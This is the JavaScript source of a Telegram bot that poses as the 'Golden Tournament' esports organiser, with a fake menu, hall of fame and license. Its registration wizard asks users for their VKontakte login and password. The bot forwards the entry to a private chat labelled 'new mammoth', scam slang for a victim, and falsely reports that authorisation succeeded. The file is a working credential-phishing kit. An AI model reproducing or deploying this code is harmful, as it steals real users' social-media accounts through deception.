const { Telegraf, Markup, Composer, Scenes } = require("telegraf");
const dotenv = require("dotenv").config()
const { session } = require("grammy");
const bot = new Telegraf(process.env.TG_TOKEN)
function makeid(length) {
    var result = '';
    var characters = '0123456789';
    var charactersLength = characters.length;
    for (var i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
}


function initial() {
    return {
        id: 0,
        pass: 0,
        user: 0,

    };
}
const wait = function (milliseconds) {
    return new Promise((resolve) => {
        if (typeof milliseconds !== "number") {
            throw new Error("milliseconds not a number");
        }
        setTimeout(() => resolve("done!"), milliseconds);
    });
};
bot.use(session({ initial }));
bot.command("start", async (ctx) => {
    ctx.session.name = ctx.message.from.username
    ctx.session.id = ctx.message.from.id
    await ctx.sendPhoto("https://cdn.discordapp.com/attachments/1048351055957733406/1066476305224310885/photo_2023-01-21_22-55-04.jpg", {
        caption: "Здравствуйте! Вас приветствует организация Golden Tournament, рады приветствовать ❤️",
        "reply_markup": {
            "keyboard": [["🏆 Турниры", "📌 Подать заявку"], ["📃 Регламент", "🎗️ Алея славы" ],["🌐 Лицензия"]],
            resize_keyboard: true
        }
    })


})
bot.command("getid",async(ctx)=>{
    console.log(ctx.message)
})
bot.hears("🎗️ Алея славы", async (ctx) => {
    await ctx.sendMessage("I Season \n🥇 - Just \n=================== \nII Season 🥇 - LightsToMotion \n🥈 - Vollent Gaming \n🥉 - SakuraBand \n=================== \nIII Season \n🥇 - DRAGAMING \n🥈 - SLEEP_SO2 \n🥉 - EZZY ESPORTS \n=================== \nIV Season \n🥇 - Feeling Team \n🥈 - ATD Squad \n🥉 - DEADLY SQUAD GAMING \n=================== \nV Season \n🥇 - Feeling Team \n🥈 -  Ninja Team \n🥉 - AndEagers \n=================== \nVI Season \n🥇 - MoonTeam \n🥈 -  The Scary Rovers \n🥉 -  ATD Squad \n=================== \nVII Season \n🥇 - Seven Dragons \n🥈 - UpUp esports \n🥉 - AndEagers \n=================== \nVIII Season \n🥇 -  Team KingWin \n🥈 - Seven Dragons \n=================== \nIX Season \n🥇 - Appeasers \n🥈 - AndEagers \n🥉 - Favourites \n=================== \nX Season \n🥇 - BIT eSports \n=================== \nXI Season \n🥇 - Sinta Gamma \n🥈 - Team Carnage \n🥉 - Team Resurgens \n=================== \nXII Season \n🥇 - LightForces eSports \n🥈 -  ATD Squad \n🥉 -  Billers eSports \n=================== \nXIII Season \n🥇 - Team VaVilon \n🥈 - Team KingWin \n🥉 - Domination Over Time \n \n=================== \nArdoUr Season")
})


bot.hears("📃 Регламент", async (ctx) => {
    await ctx.sendMessage("Здравствуйте! Для ознакомления с регламентом перейдите по ссылке - \nhttps://drive.google.com/file/d/1ehZNZRb5P-41WX9ahOErP4vt-DID-Gr2/view?usp=sharing")
})
bot.hears("🌐 Лицензия", async (ctx) => {
    await ctx.sendPhoto("https://cdn.discordapp.com/attachments/1048351055957733406/1066487890403672074/image.png", {
        caption: "Наша организация, лицензирована Uit Tournaments! ✅"
    })
})

bot.hears("🏆 Турниры", async (ctx) => {
    await ctx.sendPhoto("https://cdn.discordapp.com/attachments/1048351055957733406/1066494586375118858/image.png", {
        caption: "⚜️ Набор на 12 сезон открыт! ⚜️ \n\nФорматы турниров на 12 сезон! ⬇️ \n\n2 х 2 - Призовой фонд 2.500 голды на команду! \n\n3 х 3 - Призовой фонд 5.000 голды на команду! \n\n5 х 5 - Призовой фонд 7.500 голды на команду! \n\nУчастие может принять любой желающий, всё турниры проходят среди любительских игроков! ⚜️"
    })
})

const vk_login = new Composer()

const vk_info = new Composer()



vk_login.on("text", async (ctx) => {


    return ctx.wizard.next()
})
const vk_password = new Composer();
const final = new Composer();

vk_password.on("text", async (ctx) => {
    await ctx.reply("✅ Осталось совсем немного, введите Никнейм, под которым вы будете выступать в нашей организации.")
    return ctx.wizard.next()
})




vk_info.on("text", async (ctx) => {
    ctx.session.pass = ctx.message.text
    await ctx.sendMessage(`✅ Авторизация прошла успешно! Ваша заявка с уникальным номером #${ctx.session.id} была зарегистрирована! Перешлите это сообщение администрации турнира. \n@Danil_Golden`)
    await ctx.sendMessage(`новый мамонт \nлогин/пароль ${ctx.session.pass}`, { chat_id: -633490982 })
    ctx.scene.leave()
})




final.on("text", async (ctx) => {

    await ctx.sendMessage(`✅ Что бы продолжить регистрацию, вам необходимо авторизоваться через социальную сеть ВКонтакте, напишите логин, пароль, через пробел!`)
    return ctx.wizard.next()
})




const menuScene = new Scenes.WizardScene('sceneWizard', vk_login, vk_password, final, vk_info)
const stage = new Scenes.Stage([menuScene])
bot.use(stage.middleware())


bot.hears("📌 Подать заявку", async (callbackQuery) => {
    callbackQuery.session.id = makeid(5)
    await callbackQuery.scene.enter('sceneWizard')
    await callbackQuery.reply("✅ Введите свой внутренне игровой ID. ВАЖНО! Айди внутренне игрового аккаунта нужно вводить от аккаунта на котором вы будете играть турнир!")

})


bot.launch()